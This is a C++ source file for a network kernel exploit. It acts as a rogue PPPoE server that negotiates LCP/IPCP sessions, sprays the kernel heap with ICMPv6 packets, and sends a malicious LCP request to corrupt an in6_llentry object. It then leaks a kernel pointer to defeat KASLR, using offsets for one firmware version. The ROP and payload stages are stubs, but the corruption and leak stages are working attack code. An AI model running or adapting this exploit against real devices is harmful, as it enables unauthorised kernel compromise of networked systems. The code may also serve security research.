#include <iostream>
#include <sstream>

#include <IPv6Layer.h>
#include <Packet.h>
#include <PcapLiveDevice.h>
#include <PcapLiveDeviceList.h>
#include <SystemUtils.h>
#include <PPPoELayer.h>
#include <EthLayer.h>
#include <GreLayer.h>
#include <PayloadLayer.h>
#include <EndianPortable.h>
#include <IcmpV6Layer.h>
#include <NdpLayer.h>
#include <Logger.h>

#include "exploit.h"

#define SPRAY_NUM 0x1000
#define PIN_NUM 0x1000
#define CORRUPT_NUM 0x1

#define HOLE_START 0x400
#define HOLE_SPACE 0x10

#define LCP_ID 0x41
#define IPCP_ID 0x41

#define SESSION_ID 0xffff

#define STAGE2_PORT 9020

#define PPP_IPCP_Option_IP 0x03

const static std::string SOURCE_MAC = "41:41:41:41:41:41";
const static std::string SOURCE_IPV4 = "41.41.41.41";
const static std::string SOURCE_IPV6 = "fe80::4141:4141:4141:4141";

const static std::string TARGET_IPV4 = "42.42.42.42";

const static std::string BPF_FILTER = "(ip6) || (pppoed) || (pppoes && !ip)";

struct Cookie {
    pcpp::Packet packet;
};

//#define DEBUG_STAGE

#ifdef DEBUG_STAGE
#undef SPRAY_NUM
#undef PIN_NUM
#undef CORRUPT_NUM
#define SPRAY_NUM 0x1
#define PIN_NUM 0x1
#define CORRUPT_NUM 0x1

#undef hexdump_verbose
#define hexdump_verbose(packet) hexdump(packet)
#endif

// todo: Support big endian system
#define V64(list, index, data) (*(uint64_t *) &(list)[index]) = data
#define V32(list, index, data) (*(uint32_t *) &(list)[index]) = data
#define V16(list, index, data) (*(uint16_t *) &(list)[index]) = data
#define V8(list, index, data) (*(uint8_t *) &(list)[index]) = data

#define CHECK_RET(value) if((value) != 0) return 1

static pcpp::PPPoESessionLayer *getPPPoESessionLayer(const pcpp::Packet &packet, uint16_t pppType) {
    if (!packet.isPacketOfType(pcpp::PPPoESession)) return nullptr;
    auto *pppLayer = packet.getLayerOfType<pcpp::PPPoESessionLayer>();
    if (pppLayer && pppLayer->getPPPNextProtocol() == pppType) return pppLayer;
    return nullptr;
}

static pcpp::PPPoEDiscoveryLayer *getPPPoEDiscoveryLayer(const pcpp::Packet &packet, uint8_t type) {
    if (!packet.isPacketOfType(pcpp::PPPoEDiscovery)) return nullptr;
    auto *layer = packet.getLayerOfType<pcpp::PPPoEDiscoveryLayer>();
    if (layer && layer->getPPPoEHeader()->code == type) return layer;
    return nullptr;
}

LcpEchoHandler::LcpEchoHandler(const std::string &iface) {
    dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(iface);
    if (dev == nullptr) {
        std::cerr << "[-] LcpEchoHandler Cannot find interface with name of '" << iface << "'" << std::endl;
        exit(1);
    }

    pcpp::PcapLiveDevice::DeviceConfiguration config;
    config.direction = pcpp::PcapLiveDevice::PCPP_IN;
    if (!dev->open(config)) {
        std::cerr << "[-] LcpEchoHandler Cannot open device" << std::endl;
        exit(1);
    }

    if (!dev->setFilter("pppoes && !ip")) {
        std::cerr << "[-] LcpEchoHandler cannot set bfp filter" << std::endl;
    }
}

void LcpEchoHandler::run() {
    running = true;
    dev->startCaptureBlockingMode(
            [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                auto *self = (LcpEchoHandler *) cookie;
                pcpp::Packet parsedPacket(packet, pcpp::PPPoESession);
                auto *pppLayer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_LCP);
                if (!pppLayer) return !self->running;
                if (pppLayer->getLayerPayload()[0] != ECHO_REQ) return !self->running;
                auto *etherLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
                if (!etherLayer) return !self->running;

                auto &&echoReply = PacketBuilder::lcpEchoReply(etherLayer->getDestMac(), etherLayer->getSourceMac(),
                                                               pppLayer->getPPPoEHeader()->sessionId,
                                                               pppLayer->getLayerPayload()[1], // id
                                                               0); // todo: check if we need to echo back the correct magic number ?
                // correct magic number:  *(uint32_t *) &pppLayer->getLayerPayload()[4]
                self->dev->sendPacket(&echoReply);
                return !self->running;
            }, this, 0);
}

void LcpEchoHandler::stop() {
    running = false;
}

LcpEchoHandler::~LcpEchoHandler() {
    this->stop();
    this->dev->close();
}

int Exploit::setFirmwareVersion(FirmwareVersion version) {
    switch (version) {
        case FirmwareVersion::FIRMWARE_900:
            this->offs = OffsetsFirmware_900();
            break;
        default:
            std::cerr << "[-] Unsupported firmware version" << std::endl;
            return 1;
    }
    return 0;
}


int Exploit::setInterface(const std::string &iface) {
    if (dev != nullptr) this->closeInterface();

    dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(iface);
    if (dev == nullptr) {
        std::cerr << "[-] Cannot find interface with name of '" << iface << "'" << std::endl;
        return 1;
    }

    // open the device before start capturing/sending packets
    pcpp::PcapLiveDevice::DeviceConfiguration config;
    config.direction = pcpp::PcapLiveDevice::PCPP_IN;
    if (!dev->open(config)) {
        std::cerr << "[-] Cannot open device" << std::endl;
        dev = nullptr;
        return 1;
    }

    if (!dev->setFilter(BPF_FILTER)) {
        std::cerr << "[-] Cannot set bfp filter" << std::endl;
    }
    return 0;
}

void Exploit::closeInterface() {
    if (this->dev != nullptr) this->dev->close();
    this->dev = nullptr;
}

Exploit::~Exploit() {
    this->closeInterface();
}

int Exploit::lcp_negotiation() const {
    std::cout << "[*] Sending LCP configure request..." << std::endl;
    {
        auto &&packet = PacketBuilder::lcpRequest(source_mac, target_mac);
        this->dev->sendPacket(&packet);
    }

    std::cout << "[*] Waiting for LCP configure ACK..." << std::endl;
    {
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet);
                    auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_LCP);
                    if (layer) return layer->getLayerPayload()[0] == CONF_ACK;
                    return false;
                }, nullptr, 0);
    }

    std::cout << "[*] Waiting for LCP configure request..." << std::endl;
    uint8_t lcp_id = 0;
    {
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet);
                    auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_LCP);
                    if (layer) {
                        *((uint8_t *) cookie) = layer->getLayerPayload()[1];
                        return layer->getLayerPayload()[0] == CONF_REQ;
                    }
                    return false;
                }, &lcp_id, 0);
    }

    std::cout << "[*] Sending LCP configure ACK..." << std::endl;
    {
        auto &&packet = PacketBuilder::lcpAck(source_mac, target_mac, lcp_id);
        this->dev->sendPacket(&packet);
    }
    return 0;
}

int Exploit::ipcp_negotiation() const {
    std::cout << "[*] Sending IPCP configure request..." << std::endl;
    {
        auto &&packet = PacketBuilder::ipcpRequest(source_mac, target_mac);
        this->dev->sendPacket(&packet);
    }

    std::cout << "[*] Waiting for IPCP configure ACK..." << std::endl;
    {
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet);
                    auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_IPCP);
                    if (layer) return layer->getLayerPayload()[0] == CONF_ACK;
                    return false;
                }, nullptr, 0);
    }

    std::cout << "[*] Waiting for IPCP configure request..." << std::endl;
    uint8_t ipcp_id = 0;
    {
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet);
                    auto *lcp_id = (uint8_t *) cookie;
                    auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_IPCP);
                    if (layer) {
                        *lcp_id = layer->getLayerPayload()[1];
                        return layer->getLayerPayload()[0] == CONF_REQ;
                    }
                    return false;
                }, &ipcp_id, 0);
    }

    std::cout << "[*] Sending IPCP configure NAK..." << std::endl;
    {
        auto &&packet = PacketBuilder::ipcpNak(source_mac, target_mac, ipcp_id);
        this->dev->sendPacket(&packet);
    }

    std::cout << "[*] Waiting for IPCP configure request..." << std::endl;
    Cookie pkt;
    {
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet, pcpp::PPPoESession);
                    auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_IPCP);
                    if (layer && layer->getLayerPayload()[0] == CONF_REQ) {
                        ((Cookie *) cookie)->packet = parsedPacket;
                        return true;
                    }
                    return false;
                }, &pkt, 0);
    }

    std::cout << "[*] Sending IPCP configure ACK..." << std::endl;
    {
        auto *layer = getPPPoESessionLayer(pkt.packet, PCPP_PPP_IPCP);
        if (!layer) {
            std::cerr << "[-] No IPCP layer found in packet" << std::endl;
            return 1;
        }
        uint8_t id = layer->getLayerPayload()[1];
        uint8_t *options = layer->getLayerPayload() + 4;
        uint8_t optionLen = layer->getLayerPayload()[5];

        auto &&packet = PacketBuilder::ipcpAck(source_mac, target_mac, id, options, optionLen);
        this->dev->sendPacket(&packet);
    }
    return 0;
}

int Exploit::ppp_negotiation(const std::function<std::vector<uint8_t>(Exploit *)> &cb, bool ignore_initial_req) {
    int padi_count = ignore_initial_req ? 2 : 1;

    Cookie pkt;
    while (padi_count--) {
        std::cout << "[*] Waiting for PADI..." << std::endl;
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet, pcpp::PPPoEDiscovery);
                    auto *layer = getPPPoEDiscoveryLayer(parsedPacket, pcpp::PPPoELayer::PPPOE_CODE_PADI);
                    if (!layer) return false;
                    ((Cookie *) cookie)->packet = parsedPacket;
                    return true;
                }, &pkt, 0);
    }

    auto *pppoeDiscoveryLayer = pkt.packet.getLayerOfType<pcpp::PPPoEDiscoveryLayer>();
    if (!pppoeDiscoveryLayer) {
        std::cerr << "[-] No PPPoE discovery layer found in PADI packet" << std::endl;
        return 1;
    }
    uint8_t *host_uniq = nullptr;
    pcpp::PPPoEDiscoveryLayer::PPPoETag tag = pppoeDiscoveryLayer->getFirstTag();
    while (tag.isNotNull()) {
        if (tag.getType() == pcpp::PPPoEDiscoveryLayer::PPPOE_TAG_HOST_UNIQ) {
            host_uniq = tag.getValue();
            break;
        }
        tag = pppoeDiscoveryLayer->getNextTag(tag);
    }
    if (!host_uniq) {
        std::cerr << "[-] No host-uniq tag found in PADI packet" << std::endl;
        return 1;
    }
    if (tag.getDataSize() != sizeof(uint64_t)) {
        std::cerr << "[-] Invalid host-uniq tag size: " << tag.getDataSize() << std::endl;
        return 1;
    }

    memcpy(&pppoe_softc, host_uniq, sizeof(pppoe_softc));
    std::cout << "[+] pppoe_softc: 0x" << std::hex << pppoe_softc << std::endl;

    auto *ethLayer = pkt.packet.getLayerOfType<pcpp::EthLayer>();
    if (ethLayer) {
        target_mac = ethLayer->getSourceMac();
        std::cout << "[+] Target MAC: " << target_mac << std::endl;
    }

    source_mac = pcpp::MacAddress(SOURCE_MAC);

    std::vector<uint8_t> ac_cookie;
    if (cb)
        ac_cookie = cb(this);
    std::cout << "[+] AC cookie length: " << std::hex << ac_cookie.size() << std::endl;

    std::cout << "[*] Sending PADO..." << std::endl;
    {
        auto &&packet = PacketBuilder::pado(source_mac, target_mac,
                                            ac_cookie.data(), ac_cookie.size(),
                                            host_uniq, sizeof(uint64_t));
        this->dev->sendPacket(&packet);
    }

    std::cout << "[*] Waiting for PADR..." << std::endl;
    {
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet);
                    auto *layer = getPPPoEDiscoveryLayer(parsedPacket, pcpp::PPPoELayer::PPPOE_CODE_PADR);
                    if (layer) return true;
                    return false;
                }, nullptr, 0);
    }

    std::cout << "[*] Sending PADS..." << std::endl;
    {
        auto &&packet = PacketBuilder::pads(source_mac, target_mac,
                                            host_uniq, sizeof(uint64_t));
        this->dev->sendPacket(&packet);
    }
    return 0;
}

std::vector<uint8_t> Exploit::build_fake_ifnet(Exploit *self) {
    // Leak address
    // Upper bytes are encoded with SESSION_ID
    union Converter {
        uint64_t u64;
        uint8_t u8[8];
    };
    Converter planted{};
    planted.u64 = (self->pppoe_softc + 0x07) & 0xffffffffffff;
    self->source_mac = pcpp::MacAddress(planted.u8);
    std::cout << "[+] Source MAC: " << self->source_mac << std::endl;

    // Fake ifnet
    std::vector<uint8_t> fake_ifnet(0x4e0, 'A');

    V64(fake_ifnet, 0x48, ZERO);     // if_addrhead
    V16(fake_ifnet, 0x70, 0x0001);   // if_index
    V8(fake_ifnet, 0xa0, IFT_ETHER); // ifi_type
    V8(fake_ifnet, 0xa1, 0);         // ifi_physical
    V8(fake_ifnet, 0xa2, 0x8 + 0x1); // ifi_addrlen
    V64(fake_ifnet, 0x1b8, self->pppoe_softc + PPPOE_SOFTC_SC_DEST); // if_addr
    V64(fake_ifnet, 0x428, self->pppoe_softc + 0x10 - 0x8);          // nd_ifinfo

    // if_afdata_lock
    V64(fake_ifnet, 0x480, ZERO);          // lo_name
    V32(fake_ifnet, 0x488, RW_INIT_FLAGS); // lo_flags
    V32(fake_ifnet, 0x48c, 0);             // lo_data
    V64(fake_ifnet, 0x490, ZERO);          // lo_witness
    V64(fake_ifnet, 0x498, RW_UNLOCKED);   // rw_lock

    // if_addr_mtx
    V64(fake_ifnet, 0x4c0, ZERO);           // lo_name
    V32(fake_ifnet, 0x4c8, MTX_INIT_FLAGS); // lo_flags
    V32(fake_ifnet, 0x4cc, 0);              // lo_data
    V64(fake_ifnet, 0x4d0, ZERO);           // lo_witness
    V64(fake_ifnet, 0x4d8, MTX_UNOWNED);    // mtx_lock

    return fake_ifnet;
}

std::vector<uint8_t> Exploit::build_overflow_lle(Exploit *self) {
    // Fake in6_llentry
    std::vector<uint8_t> overflow_lle(0x78, 0);

    // lle_next
    V64(overflow_lle, 0, self->pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE); // le_next
    V64(overflow_lle, 0x8, ZERO); // le_prev

    // lle_lock
    V64(overflow_lle, 0x10, ZERO); // lo_name
    V32(overflow_lle, 0x18, RW_INIT_FLAGS | LO_DUPOK); // lo_flags
    V32(overflow_lle, 0x1c, 0);           // lo_data
    V64(overflow_lle, 0x20, ZERO);        // lo_witness
    V64(overflow_lle, 0x28, RW_UNLOCKED); // rw_lock

    V64(overflow_lle, 0x30, self->pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE - LLTABLE_LLTIFP); // lle_tbl
    V64(overflow_lle, 0x38, ZERO); // lle_head
    V64(overflow_lle, 0x40, ZERO); // lle_free
    V64(overflow_lle, 0x48, ZERO); // la_hold
    V32(overflow_lle, 0x50, 0);    // la_numheld
    V32(overflow_lle, 0x54, 0);    // pad
    V64(overflow_lle, 0x58, 0);    // la_expire

    V16(overflow_lle, 0x60, LLE_EXCLUSIVE);      // la_flags
    V16(overflow_lle, 0x62, 0);                  // la_asked
    V16(overflow_lle, 0x64, 0);                  // la_preempt
    V16(overflow_lle, 0x66, 0);                  // ln_byhint
    V16(overflow_lle, 0x68, ND6_LLINFO_NOSTATE); // ln_state
    V16(overflow_lle, 0x6a, 0);                  // ln_router
    V32(overflow_lle, 0x6c, 0);                  // pad
    V64(overflow_lle, 0x70, 0x7fffffffffffffff); // ln_ntick

    return overflow_lle;
}

std::vector<uint8_t> Exploit::build_fake_lle(Exploit *self) {
    (void) self;
    return {};
}

std::vector<uint8_t> Exploit::build_first_rop(Exploit *self) {
    (void) self;
    return {};
}

std::vector<uint8_t> Exploit::build_second_rop(Exploit *self) {
    (void) self;
    return {};
}

int Exploit::stage0() {
    CHECK_RET(this->ppp_negotiation(Exploit::build_fake_ifnet, true));
    CHECK_RET(this->lcp_negotiation());
    CHECK_RET(this->ipcp_negotiation());

    std::cout << "[*] Waiting for interface to be ready..." << std::endl;
    dev->startCaptureBlockingMode(
            [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                auto *self = (Exploit *) cookie;
                pcpp::Packet parsedPacket(packet, pcpp::ICMPv6);
                if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                auto *layer = parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
                if (layer && layer->getMessageType() == pcpp::ICMPv6MessageType::ICMPv6_ROUTER_SOLICITATION) {
                    auto *ipv6Layer = parsedPacket.getLayerOfType<pcpp::IPv6Layer>();
                    if (!ipv6Layer) return false;
                    self->target_ipv6 = ipv6Layer->getSrcIPv6Address();
                    std::cout << "[+] Target IPv6: " << self->target_ipv6 << std::endl;
                    return true;
                }
                return false;
            }, this, 0);

    for (size_t i = 0; i < SPRAY_NUM; i++) {
        if (i % 0x100 == 0) {
            std::cout << "\r[*] Heap grooming..." << std::dec << 100 * i / SPRAY_NUM << "%" << std::flush;
        }

        std::stringstream sourceIpv6;
        sourceIpv6 << "fe80::" << std::setfill('0') << std::setw(4) << std::hex << i << ":4141:4141:4141";
        {
            auto &&packet = PacketBuilder::icmpv6Echo(this->source_mac, this->target_mac,
                                                      pcpp::IPv6Address(sourceIpv6.str()), this->target_ipv6);
            dev->sendPacket(&packet);
        }

        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet, pcpp::ICMPv6);
                    if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                    auto *layer = parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
                    if (!layer) return false;
                    return layer->getMessageType() == pcpp::ICMPv6MessageType::ICMPv6_NEIGHBOR_SOLICITATION;
                }, nullptr, 0);

        if (i >= HOLE_START && i % HOLE_SPACE == 0) continue;

        {
            auto &&packet = PacketBuilder::icmpv6Na(this->source_mac, this->target_mac,
                                                    pcpp::IPv6Address(sourceIpv6.str()), this->target_ipv6);
            dev->sendPacket(&packet);
        }
    }
    std::cout << "\r[+] Heap grooming...done" << std::endl;

    return 0;
}

int Exploit::stage1() {
    /**
     * Send invalid packet to trigger a printf in the kernel. For some
     * reason, this causes scheduling on CPU 0 at some point, which makes
     * the next allocation use the same per-CPU cache.
     */
    {
        auto &&packet = PacketBuilder::pinCpu0(this->source_mac, this->target_mac);
        for (int i = 0; i < PIN_NUM; ++i) {
            if (i % 0x100 == 0) {
                std::cout << std::dec << "\r[*] Pinning to CPU 0..." << std::setfill('0') << std::setw(2)
                          << (100 * i / PIN_NUM) << "%" << std::flush;
            }
            dev->sendPacket(&packet);
            pcpp::multiPlatformMSleep(1);
        }
    }

    std::cout << "\r[+] Pinning to CPU 0...done" << std::endl;

    // LCP fails sometimes without the wait
    pcpp::multiPlatformMSleep(1000);

    // Corrupt in6_llentry object
    {
        std::vector<uint8_t> overflow_lle = Exploit::build_overflow_lle(this);
        std::cout << "[*] Sending malicious LCP configure request..." << std::endl;
        auto &&packet = PacketBuilder::maliciousLcp(this->source_mac, this->target_mac, overflow_lle.data(),
                                                    overflow_lle.size());
        for (int i = 0; i < CORRUPT_NUM; ++i) {
            dev->sendPacket(&packet);
        }
    }

    std::cout << "[*] Waiting for LCP configure reject..." << std::endl;
    dev->startCaptureBlockingMode(
            [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                pcpp::Packet parsedPacket(packet);
                auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_LCP);
                if (layer) return layer->getLayerPayload()[0] == CONF_REJ;
                return false;
            }, nullptr, 0);

    // Re-negotiate after rejection
    CHECK_RET(this->lcp_negotiation());
    CHECK_RET(this->ipcp_negotiation());

    bool corrupted = false;
    std::stringstream sourceIpv6;
    for (int i = SPRAY_NUM - 1; i >= 0; --i) {
        if (i % 0x100 == 0) {
            std::cout << "\r[*] Scanning for corrupted object... 0x"
                      << std::setfill('0') << std::setw(3)
                      << std::hex << i << std::flush;
        }

        if (i >= HOLE_START && i % HOLE_SPACE == 0) {
            continue;
        }

        sourceIpv6.clear();
        sourceIpv6.str("");
        sourceIpv6 << "fe80::" << std::setfill('0') << std::setw(4) << std::hex << i << ":4141:4141:4141";

        {
            auto &&packet = PacketBuilder::icmpv6Echo(this->source_mac, this->target_mac,
                                                      pcpp::IPv6Address(sourceIpv6.str()), this->target_ipv6);
            dev->sendPacket(&packet);
        }

        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet);
                    auto *corrupted = (bool *) cookie;
                    if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                    auto *layer =
                            parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
                    if (layer) {
                        if (layer->getMessageType() == pcpp::ICMPv6MessageType::ICMPv6_ECHO_REPLY) {
                            return true;
                        } else if (layer->getMessageType() ==
                                   pcpp::ICMPv6MessageType::ICMPv6_NEIGHBOR_SOLICITATION) {
                            *corrupted = true;
                            return true;
                        }
                    }
                    return false;
                }, &corrupted, 0);

        if (corrupted) break;

        {
            auto &&packet = PacketBuilder::icmpv6Na(this->source_mac, this->target_mac,
                                                    pcpp::IPv6Address(sourceIpv6.str()), this->target_ipv6);
            dev->sendPacket(&packet);
        }
    }

    if (!corrupted) {
        std::cerr << "\r[-] Scanning for corrupted object...failed. Please retry." << std::endl;
        return 1;
    }

    std::cout << "\r[+] Scanning for corrupted object...found " << sourceIpv6.str() << std::endl;
    return 0;
}

int Exploit::stage2() {
    std::cout << std::endl << "[*] Defeating KASLR..." << std::endl;
    dev->startCaptureBlockingMode(
            [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                pcpp::Packet parsedPacket(packet, pcpp::ICMPv6);
                if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                auto *ipv6Layer = parsedPacket.getLayerOfType<pcpp::IPv6Layer>();
                if (!ipv6Layer) return false;
                auto *icmpv6Layer = parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
                if (!icmpv6Layer) return false;
                if (icmpv6Layer->getMessageType() != pcpp::ICMPv6MessageType::ICMPv6_NEIGHBOR_SOLICITATION) return false;
                if (ipv6Layer->getLayerPayloadSize() < 24) return false;
                uint8_t *option = ipv6Layer->getLayerPayload() + 24;
                if (option[0] != 1) return false; // type 1 is ICMPv6NDOptSrcLLAddr
                if (option[1] > 1) {
                    auto *self = (Exploit *) cookie;
                    self->pppoe_softc_list = *(uint64_t *) (option + 3);
                    return true; // length > 1
                }
                return false;
            }, this, 0);

    std::cout << "[+] pppoe_softc_list: 0x" << std::hex << pppoe_softc_list << std::endl;

    this->kaslr_offset = pppoe_softc_list - offs.PPPOE_SOFTC_LIST;
    std::cout << "[+] kaslr_offset: 0x" << std::hex << kaslr_offset << std::endl;

    if ((pppoe_softc_list & 0xffffffff00000fff) != (offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff)) {
        std::cout << "[-] Error: Leak is invalid. Wrong firmware?" << std::endl;
        return 1;
    }

    return 0;
}

int Exploit::stage3() {
    return 0;
}

int Exploit::stage4() {
    return 0;
}

int Exploit::run() {
    if (dev == nullptr) return 1;
    std::cout << std::endl << "[+] STAGE 0: Initialization" << std::endl;
    CHECK_RET(stage0());

    std::cout << std::endl << "[+] STAGE 1: Memory corruption" << std::endl;
    CHECK_RET(stage1());

    std::cout << std::endl << "[+] STAGE 2: KASLR defeat" << std::endl;
    CHECK_RET(stage2());

    std::cout << std::endl << "[+] STAGE 3: Remote code execution" << std::endl;
    CHECK_RET(stage3());

    std::cout << std::endl << "[+] STAGE 4: Arbitrary payload execution" << std::endl;
    CHECK_RET(stage4());

    return 0;
}